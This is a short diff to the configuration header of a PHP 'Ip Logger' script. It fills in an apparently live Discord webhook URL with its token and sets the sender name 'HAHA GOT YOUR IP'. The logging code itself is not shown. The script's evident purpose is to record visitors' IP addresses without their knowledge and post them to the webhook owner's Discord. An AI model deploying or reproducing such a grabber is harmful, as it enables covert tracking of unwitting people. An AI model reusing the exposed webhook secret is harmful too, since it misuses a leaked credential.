@@ -1,9 +1,9 @@
 <?php
 
-$Webhook    = "https://discord.com/api/webhooks/"; //Webhook here
-$WebhookTag = "Ip Logger"; //Name this whatever you want
-$WebhookAvatar = "https://vgy.me/GQe9bJ.png"; //Change this to your the avatar you prefer
-$DEmbedColor = "FFFFFF"; //Change the color of the Discord Embed must be in hex "FFFFFF"
+$Webhook    = "https://discord.com/api/webhooks/1137941821356523590/dXHFFp4fxv3C6bBXbOracwW5bJt5dgw3MdBKB4Dh3si00j97xcqXjKkpyTsu_rViajYa"; //Webhook here
+$WebhookTag = "HAHA GOT YOUR IP"; //Name this whatever you want
+$WebhookAvatar = "https://blog.prepscholar.com/hs-fs/hubfs/body-the-green-square.jpeg?width=400&name=body-the-green-square.jpeg"; //Change this to your the avatar you prefer
+$DEmbedColor = "0000FF"; //Change the color of the Discord Embed must be in hex "FFFFFF"
 
 //                        Dont Edit Unless You Know What You're Doing!
 //\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\
